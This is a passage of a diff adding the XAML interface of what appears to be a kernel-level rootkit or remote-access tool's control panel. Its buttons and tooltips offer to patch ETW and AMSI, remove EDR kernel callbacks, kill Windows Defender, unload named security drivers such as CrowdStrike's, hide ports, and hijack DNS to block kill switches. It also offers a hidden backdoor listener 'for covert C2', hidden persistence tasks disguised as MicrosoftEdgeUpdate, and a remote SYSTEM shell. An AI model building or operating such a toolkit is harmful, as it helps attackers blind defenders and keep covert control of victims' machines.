+                                </WrapPanel>
+                                <WrapPanel HorizontalAlignment="Center" Margin="0,5,0,0">
+                                    <Button x:Name="btnSwapDriver" Content="Swap MS Driver" Style="{StaticResource DarkButton}" Width="160" Click="BtnSwapDriver_Click"/>
+                                </WrapPanel>
+                            </StackPanel>
+                        </GroupBox>
+                    </StackPanel>
+                </ScrollViewer>
+            </TabItem>
+
+            <!-- ==================== AV/EDR TAB ==================== -->
+            <TabItem Header="AV/EDR" Style="{StaticResource DarkTabItem}">
+                <ScrollViewer VerticalScrollBarVisibility="Auto">
+                    <StackPanel Margin="5">
+                        
+                        <!-- Telemetry Killing -->
+                        <GroupBox Header="Telemetry &amp; Monitoring" Style="{StaticResource DarkGroupBox}">
+                            <StackPanel>
+                                <TextBlock Text="Disable Windows telemetry and security monitoring at the kernel level." 
+                                           Foreground="#888" Margin="0,0,0,10" TextWrapping="Wrap"/>
+                                <WrapPanel HorizontalAlignment="Center">
+                                    <Button x:Name="btnKillETW" Content="Kill ETW (Telemetry)" Style="{StaticResource DangerButton}" Width="200" Click="BtnKillETW_Click"
+                                            ToolTip="Patches ntoskrnl!EtwWrite to disable Event Tracing for Windows. Blinds security monitoring."/>
+                                    <Button x:Name="btnKillAMSI" Content="Kill AMSI" Style="{StaticResource DangerButton}" Width="200" Click="BtnKillAMSI_Click"
+                                            ToolTip="Patches amsi.dll!AmsiScanBuffer to bypass Antimalware Scan Interface."/>
+                                </WrapPanel>
+                                <WrapPanel HorizontalAlignment="Center" Margin="0,5,0,0">
+                                    <TextBlock x:Name="lblETWStatus" Text="ETW: Active" Foreground="{StaticResource WarningYellow}" 
+                                               VerticalAlignment="Center" Margin="20,0"/>
+                                    <TextBlock x:Name="lblAMSIStatus" Text="AMSI: Active" Foreground="{StaticResource WarningYellow}" 
+                                               VerticalAlignment="Center" Margin="20,0"/>
+                                </WrapPanel>
+                            </StackPanel>
+                        </GroupBox>
+
+                        <!-- EDR/AV Callback Removal -->
+                        <GroupBox Header="EDR/AV Callback Removal" Style="{StaticResource DarkGroupBox}">
+                            <StackPanel>
+                                <TextBlock Text="Remove kernel callbacks used by security products to monitor system activity." 
+                                           Foreground="#888" Margin="0,0,0,10" TextWrapping="Wrap"/>
+                                <WrapPanel HorizontalAlignment="Center">
+                                    <Button x:Name="btnKillProcessCallbacks" Content="Remove Process Callbacks" Style="{StaticResource DangerButton}" Width="220" Click="BtnKillProcessCallbacks_Click"
+                                            ToolTip="Removes PsSetCreateProcessNotifyRoutine callbacks - stops EDR from monitoring process creation."/>
+                                    <Button x:Name="btnKillThreadCallbacks" Content="Remove Thread Callbacks" Style="{StaticResource DangerButton}" Width="220" Click="BtnKillThreadCallbacks_Click"
+                                            ToolTip="Removes PsSetCreateThreadNotifyRoutine callbacks - stops EDR from monitoring thread creation."/>
+                                </WrapPanel>
+                                <WrapPanel HorizontalAlignment="Center" Margin="0,5,0,0">
+                                    <Button x:Name="btnKillImageCallbacks" Content="Remove Image Callbacks" Style="{StaticResource DangerButton}" Width="220" Click="BtnKillImageCallbacks_Click"
+                                            ToolTip="Removes PsSetLoadImageNotifyRoutine callbacks - stops EDR from monitoring DLL/driver loading."/>
+                                    <Button x:Name="btnKillRegistryCallbacks" Content="Remove Registry Callbacks" Style="{StaticResource DangerButton}" Width="220" Click="BtnKillRegistryCallbacks_Click"
+                                            ToolTip="Removes CmRegisterCallback - stops EDR from monitoring registry access."/>
+                                </WrapPanel>
+                                <WrapPanel HorizontalAlignment="Center" Margin="0,10,0,0">
+                                    <Button x:Name="btnKillAllCallbacks" Content="☠ KILL ALL CALLBACKS ☠" Style="{StaticResource DangerButton}" Width="300" 
+                                            FontWeight="Bold" Click="BtnKillAllCallbacks_Click"
+                                            ToolTip="Removes ALL kernel callbacks at once. This will blind most EDR/AV products."/>
+                                </WrapPanel>
+                            </StackPanel>
+                        </GroupBox>
+
+                        <!-- Security Product Removal -->
+                        <GroupBox Header="Security Product Removal" Style="{StaticResource DarkGroupBox}">
+                            <StackPanel>
+                                <TextBlock Text="Permanently disable or remove security products from the system." 
+                                           Foreground="#888" Margin="0,0,0,10" TextWrapping="Wrap"/>
+                                <WrapPanel HorizontalAlignment="Center">
+                                    <Button x:Name="btnDisableDefender" Content="Kill Windows Defender" Style="{StaticResource DangerButton}" Width="200" Click="BtnDisableDefender_Click"
+                                            ToolTip="Permanently disables Windows Defender: kills processes, stops services, modifies registry."/>
+                                    <Button x:Name="btnUnloadEDRDriver" Content="Unload EDR Driver" Style="{StaticResource DangerButton}" Width="200" Click="BtnUnloadEDRDriver_Click"
+                                            ToolTip="Force unload a security driver. Enter driver name below."/>
+                                </WrapPanel>
+                                <Grid Margin="0,10,0,0">
+                                    <Grid.ColumnDefinitions>
+                                        <ColumnDefinition Width="120"/>
+                                        <ColumnDefinition Width="*"/>
+                                        <ColumnDefinition Width="Auto"/>
+                                    </Grid.ColumnDefinitions>
+                                    <Label Content="Driver Name:"/>
+                                    <TextBox x:Name="txtEDRDriverName" Grid.Column="1" Style="{StaticResource DarkTextBox}" 
+                                             Text="WdFilter" ToolTip="Enter the driver name to unload (e.g., WdFilter, csagent, SentinelMonitor)"/>
+                                    <Button Content="Unload" Grid.Column="2" Style="{StaticResource DangerButton}" Width="100" 
+                                            Margin="10,0,0,0" Click="BtnUnloadSpecificDriver_Click"/>
+                                </Grid>
+                                <TextBlock Text="Common EDR drivers: WdFilter (Defender), csagent (CrowdStrike), SentinelMonitor (S1), cyoptics (Cylance)" 
+                                           Foreground="#666" FontSize="11" Margin="0,5,0,0" TextWrapping="Wrap"/>
+                            </StackPanel>
+                        </GroupBox>
+
+                        <!-- SSDT Unhooking -->
+                        <GroupBox Header="SSDT Operations" Style="{StaticResource DarkGroupBox}">
+                            <StackPanel>
+                                <TextBlock Text="Restore original System Service Descriptor Table entries modified by security products." 
+                                           Foreground="#888" Margin="0,0,0,10" TextWrapping="Wrap"/>
+                                <WrapPanel HorizontalAlignment="Center">
+                                    <Button x:Name="btnUnhookSSDT" Content="Unhook SSDT" Style="{StaticResource DangerButton}" Width="200" Click="BtnUnhookSSDT_Click"
+                                            ToolTip="Restores original SSDT entries by reading from ntoskrnl.exe on disk."/>
+                                    <Button x:Name="btnListSSDTHooks" Content="List SSDT Hooks" Style="{StaticResource DarkButton}" Width="200" Click="BtnListSSDTHooks_Click"
+                                            ToolTip="Scans SSDT for hooked entries and displays them in the log."/>
+                                </WrapPanel>
+                            </StackPanel>
+                        </GroupBox>
+                    </StackPanel>
+                </ScrollViewer>
+            </TabItem>
+
+            <!-- ==================== NETWORKING TAB ==================== -->
+            <TabItem Header="Networking" Style="{StaticResource DarkTabItem}">
+                <ScrollViewer VerticalScrollBarVisibility="Auto">
+                    <StackPanel Margin="5">
+                        
+                        <!-- Connection Hiding -->
+                        <GroupBox Header="Connection Stealth" Style="{StaticResource DarkGroupBox}">
+                            <StackPanel>
+                                <TextBlock Text="Hide network connections from netstat, Task Manager, and security tools." 
+                                           Foreground="#888" Margin="0,0,0,10" TextWrapping="Wrap"/>
+                                <Grid Margin="0,0,0,10">
+                                    <Grid.ColumnDefinitions>
+                                        <ColumnDefinition Width="100"/>
+                                        <ColumnDefinition Width="150"/>
+                                        <ColumnDefinition Width="80"/>
+                                        <ColumnDefinition Width="100"/>
+                                        <ColumnDefinition Width="*"/>
+                                    </Grid.ColumnDefinitions>
+                                    <Label Content="Local Port:"/>
+                                    <TextBox x:Name="txtHidePort" Grid.Column="1" Style="{StaticResource DarkTextBox}" 
+                                             ToolTip="Port number to hide (e.g., 4782)"/>
+                                    <Label Content="Protocol:" Grid.Column="2"/>
+                                    <ComboBox x:Name="cboProtocol" Grid.Column="3" Style="{StaticResource DarkComboBox}">
+                                        <ComboBoxItem Content="TCP" IsSelected="True" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="UDP" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="Both" Foreground="#DCDCDC"/>
+                                    </ComboBox>
+                                </Grid>
+                                <WrapPanel HorizontalAlignment="Center">
+                                    <Button x:Name="btnHidePort" Content="Hide Port" Style="{StaticResource DarkButton}" Width="160" Click="BtnHidePort_Click"
+                                            ToolTip="Hide TCP/UDP port from netstat, Task Manager, Resource Monitor, and Get-NetTCPConnection. Port won't appear in any network listings."/>
+                                    <Button x:Name="btnUnhidePort" Content="Unhide Port" Style="{StaticResource DarkButton}" Width="160" Click="BtnUnhidePort_Click"
+                                            ToolTip="Remove port hiding - makes the port visible in netstat and network tools again."/>
+                                    <Button x:Name="btnListHiddenPorts" Content="List Hidden" Style="{StaticResource DarkButton}" Width="120" Click="BtnListHiddenPorts_Click"
+                                            ToolTip="Show all currently hidden ports."/>
+                                </WrapPanel>
+                                <WrapPanel HorizontalAlignment="Center" Margin="0,5,0,0">
+                                    <TextBlock x:Name="lblHiddenPorts" Text="Hidden Ports: None" Foreground="#888" VerticalAlignment="Center"/>
+                                </WrapPanel>
+                            </StackPanel>
+                        </GroupBox>
+
+                        <!-- DNS Hijacking -->
+                        <GroupBox Header="DNS Hijacking" Style="{StaticResource DarkGroupBox}">
+                            <StackPanel>
+                                <TextBlock Text="Redirect domain lookups at the kernel level. Useful for blocking kill switches or redirecting traffic." 
+                                           Foreground="#888" Margin="0,0,0,10" TextWrapping="Wrap"/>
+                                <Grid Margin="0,0,0,10">
+                                    <Grid.ColumnDefinitions>
+                                        <ColumnDefinition Width="100"/>
+                                        <ColumnDefinition Width="*"/>
+                                        <ColumnDefinition Width="80"/>
+                                        <ColumnDefinition Width="*"/>
+                                    </Grid.ColumnDefinitions>
+                                    <Label Content="Domain:"/>
+                                    <TextBox x:Name="txtDNSDomain" Grid.Column="1" Style="{StaticResource DarkTextBox}" 
+                                             Text="killswitch.malware.com" Margin="0,0,10,0"/>
+                                    <Label Content="Redirect:" Grid.Column="2"/>
+                                    <TextBox x:Name="txtDNSRedirect" Grid.Column="3" Style="{StaticResource DarkTextBox}" 
+                                             Text="127.0.0.1" ToolTip="IP to redirect to (use 127.0.0.1 to block)"/>
+                                </Grid>
+                                <WrapPanel HorizontalAlignment="Center">
+                                    <Button x:Name="btnAddDNSRule" Content="Add DNS Rule" Style="{StaticResource DarkButton}" Width="160" Click="BtnAddDNSRule_Click"
+                                            ToolTip="Redirect DNS queries at kernel level. Use 127.0.0.1 to block a domain (kill switch protection)."/>
+                                    <Button x:Name="btnRemoveDNSRule" Content="Remove DNS Rule" Style="{StaticResource DarkButton}" Width="160" Click="BtnRemoveDNSRule_Click"
+                                            ToolTip="Remove a DNS redirect rule to restore normal DNS resolution for a domain."/>
+                                    <Button x:Name="btnListDNSRules" Content="List Rules" Style="{StaticResource DarkButton}" Width="120" Click="BtnListDNSRules_Click"
+                                            ToolTip="Show all active DNS hijack rules."/>
+                                </WrapPanel>
+                            </StackPanel>
+                        </GroupBox>
+
+                        <!-- Packet Filtering -->
+                        <GroupBox Header="Packet Filtering" Style="{StaticResource DarkGroupBox}">
+                            <StackPanel>
+                                <TextBlock Text="Drop or modify network packets at the kernel level." 
+                                           Foreground="#888" Margin="0,0,0,10" TextWrapping="Wrap"/>
+                                <Grid Margin="0,0,0,10">
+                                    <Grid.ColumnDefinitions>
+                                        <ColumnDefinition Width="100"/>
+                                        <ColumnDefinition Width="*"/>
+                                        <ColumnDefinition Width="80"/>
+                                        <ColumnDefinition Width="80"/>
+                                    </Grid.ColumnDefinitions>
+                                    <Label Content="Target IP:"/>
+                                    <TextBox x:Name="txtFilterIP" Grid.Column="1" Style="{StaticResource DarkTextBox}" 
+                                             Text="" ToolTip="IP address to filter (leave empty for all)" Margin="0,0,10,0"/>
+                                    <Label Content="Port:" Grid.Column="2"/>
+                                    <TextBox x:Name="txtFilterPort" Grid.Column="3" Style="{StaticResource DarkTextBox}" 
+                                             ToolTip="Port to filter (leave empty for all)"/>
+                                </Grid>
+                                <WrapPanel HorizontalAlignment="Center">
+                                    <Button x:Name="btnBlockIP" Content="Block IP/Port" Style="{StaticResource DangerButton}" Width="160" Click="BtnBlockIP_Click"
+                                            ToolTip="Block all network traffic to/from this IP at kernel level. Use to block other attackers, security callbacks, or unwanted connections."/>
+                                    <Button x:Name="btnUnblockIP" Content="Unblock IP/Port" Style="{StaticResource DarkButton}" Width="160" Click="BtnUnblockIP_Click"
+                                            ToolTip="Remove IP block to restore network traffic to/from this IP."/>
+                                    <Button x:Name="btnListBlocked" Content="List Blocked" Style="{StaticResource DarkButton}" Width="140" Click="BtnListBlocked_Click"
+                                            ToolTip="Show all currently blocked IPs."/>
+                                </WrapPanel>
+                            </StackPanel>
+                        </GroupBox>
+
+                        <!-- Hidden Port Binding -->
+                        <GroupBox Header="Stealth Listener" Style="{StaticResource DarkGroupBox}">
+                            <StackPanel>
+                                <TextBlock Text="Bind to ports that won't appear in netstat or be detected by port scanners." 
+                                           Foreground="#888" Margin="0,0,0,10" TextWrapping="Wrap"/>
+                                <Grid Margin="0,0,0,10">
+                                    <Grid.ColumnDefinitions>
+                                        <ColumnDefinition Width="100"/>
+                                        <ColumnDefinition Width="150"/>
+                                        <ColumnDefinition Width="*"/>
+                                    </Grid.ColumnDefinitions>
+                                    <Label Content="Bind Port:"/>
+                                    <TextBox x:Name="txtStealthPort" Grid.Column="1" Style="{StaticResource DarkTextBox}" 
+                                             Text="31337" ToolTip="Port to bind invisibly"/>
+                                </Grid>
+                                <WrapPanel HorizontalAlignment="Center">
+                                    <Button x:Name="btnStartStealth" Content="Start Stealth Listener" Style="{StaticResource DarkButton}" Width="180" Click="BtnStartStealthListener_Click"
+                                            ToolTip="Opens a hidden backdoor port in the kernel driver. The port is invisible to netstat, port scanners, and security tools. Use for covert C2 communication."/>
+                                    <Button x:Name="btnStopStealth" Content="Stop Listener" Style="{StaticResource DarkButton}" Width="140" Click="BtnStopStealthListener_Click"
+                                            ToolTip="Stop the stealth listener and close the hidden port."/>
+                                </WrapPanel>
+                            </StackPanel>
+                        </GroupBox>
+
+                        <!-- Hidden Scheduled Tasks -->
+                        <GroupBox Header="Hidden Scheduled Tasks" Style="{StaticResource DarkGroupBox}">
+                            <StackPanel>
+                                <TextBlock Text="Quick Setup: Select a template or use the Browse button to pick your payload. The task will be hidden from Task Scheduler and schtasks." 
+                                           Foreground="#888" Margin="0,0,0,10" TextWrapping="Wrap"/>
+                                
+                                <!-- Quick Template -->
+                                <Grid Margin="0,0,0,10">
+                                    <Grid.ColumnDefinitions>
+                                        <ColumnDefinition Width="100"/>
+                                        <ColumnDefinition Width="*"/>
+                                        <ColumnDefinition Width="Auto"/>
+                                    </Grid.ColumnDefinitions>
+                                    <Grid.RowDefinitions>
+                                        <RowDefinition Height="Auto"/>
+                                        <RowDefinition Height="Auto"/>
+                                        <RowDefinition Height="Auto"/>
+                                    </Grid.RowDefinitions>
+                                    
+                                    <Label Content="Template:" Grid.Row="0"/>
+                                    <ComboBox x:Name="cboTaskTemplate" Grid.Row="0" Grid.Column="1" Grid.ColumnSpan="2" Style="{StaticResource DarkComboBox}" 
+                                              SelectedIndex="0" Margin="0,0,0,5" SelectionChanged="CboTaskTemplate_SelectionChanged"
+                                              ToolTip="Choose a preset template for common persistence scenarios">
+                                        <ComboBoxItem Content="Custom (manual setup)" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="Run on Boot (SYSTEM)" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="Run on Logon (User)" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="Run Every 5 Minutes" Foreground="#DCDCDC"/>
+                                    </ComboBox>
+                                    
+                                    <Label Content="Payload:" Grid.Row="1"/>
+                                    <TextBox x:Name="txtTaskCommand" Grid.Row="1" Grid.Column="1" Style="{StaticResource DarkTextBox}" 
+                                             Margin="0,0,5,5" ToolTip="Path to the executable to run"/>
+                                    <Button x:Name="btnBrowseTask" Content="Browse..." Grid.Row="1" Grid.Column="2" Style="{StaticResource DarkButton}"
+                                            Click="BtnBrowseTask_Click" ToolTip="Select executable from your machine to upload" Padding="10,6"/>
+                                    
+                                    <Label Content="Task Name:" Grid.Row="2"/>
+                                    <TextBox x:Name="txtTaskName" Grid.Row="2" Grid.Column="1" Grid.ColumnSpan="2" Style="{StaticResource DarkTextBox}" 
+                                             Text="MicrosoftEdgeUpdate" Margin="0,0,0,5" ToolTip="Disguised name for the task (use something that looks legitimate)"/>
+                                </Grid>
+                                
+                                <WrapPanel HorizontalAlignment="Center">
+                                    <Button x:Name="btnCreateTask" Content="✚ Create Hidden Task" Style="{StaticResource AccentButton}" Width="160" Click="BtnCreateTask_Click"
+                                            ToolTip="Create the hidden scheduled task on the client"/>
+                                    <Button x:Name="btnListTasks" Content="📋 List Tasks" Style="{StaticResource DarkButton}" Width="120" Click="BtnListTasks_Click"
+                                            ToolTip="List all hidden scheduled tasks"/>
+                                    <Button x:Name="btnDeleteTask" Content="✕ Delete Task" Style="{StaticResource DangerButton}" Width="120" Click="BtnDeleteTask_Click"
+                                            ToolTip="Remove a hidden task by name"/>
+                                </WrapPanel>
+                            </StackPanel>
+                        </GroupBox>
+                    </StackPanel>
+                </ScrollViewer>
+            </TabItem>
+
+            <!-- ==================== SYSTEM SHELL TAB ==================== -->
+            <TabItem Header="SYSTEM Shell" Style="{StaticResource DarkTabItem}">
+                <Grid Margin="5">
+                    <Grid.RowDefinitions>
+                        <RowDefinition Height="*"/>
+                        <RowDefinition Height="Auto"/>
+                    </Grid.RowDefinitions>
+
+                    <!-- Shell Output -->
+                    <GroupBox Header="SYSTEM Shell Output" Style="{StaticResource DarkGroupBox}">
+                        <TextBox x:Name="txtShellOutput" Style="{StaticResource DarkTextBox}" 
+                                 IsReadOnly="True" 
+                                 TextWrapping="Wrap" 
+                                 VerticalScrollBarVisibility="Auto"
+                                 FontFamily="Consolas"
+                                 FontSize="12"
+                                 AcceptsReturn="True"
+                                 Background="#0C0C0C"
+                                 Foreground="#CCCCCC"/>
+                    </GroupBox>
+
+                    <!-- Shell Controls -->
+                    <GroupBox Grid.Row="1" Header="Command (NT AUTHORITY\SYSTEM)" Style="{StaticResource DarkGroupBox}" Margin="0,10,0,0">
+                        <Grid>
+                            <Grid.ColumnDefinitions>
+                                <ColumnDefinition Width="*"/>
+                                <ColumnDefinition Width="Auto"/>
+                                <ColumnDefinition Width="Auto"/>
+                            </Grid.ColumnDefinitions>
+                            <TextBox x:Name="txtShellCommand" Style="{StaticResource DarkTextBox}" 
+                                     FontFamily="Consolas"
+                                     FontSize="12"
+                                     KeyDown="TxtShellCommand_KeyDown"/>
+                            <Button x:Name="btnShellSend" Grid.Column="1" Content="Send" Style="{StaticResource AccentButton}" Width="80" Margin="10,0,0,0" Click="BtnShellSend_Click"/>
+                            <Button x:Name="btnShellStart" Grid.Column="2" Content="Start Shell" Style="{StaticResource DarkButton}" Width="100" Margin="10,0,0,0" Click="BtnShellStart_Click"/>
+                        </Grid>
+                    </GroupBox>
+                </Grid>
+            </TabItem>
+        </TabControl>
+
+        <!-- Log Panel -->
+        <GroupBox Grid.Row="2" Header="Log" Style="{StaticResource DarkGroupBox}" Margin="0,10,0,0">
+            <TextBox x:Name="txtLog" Style="{StaticResource DarkTextBox}" 
+                     IsReadOnly="True" 
+                     TextWrapping="Wrap" 
+                     VerticalScrollBarVisibility="Auto"
+                     FontFamily="Consolas"
+                     FontSize="11"
+                     AcceptsReturn="True"/>
+        </GroupBox>
+    </Grid>
+</Window>
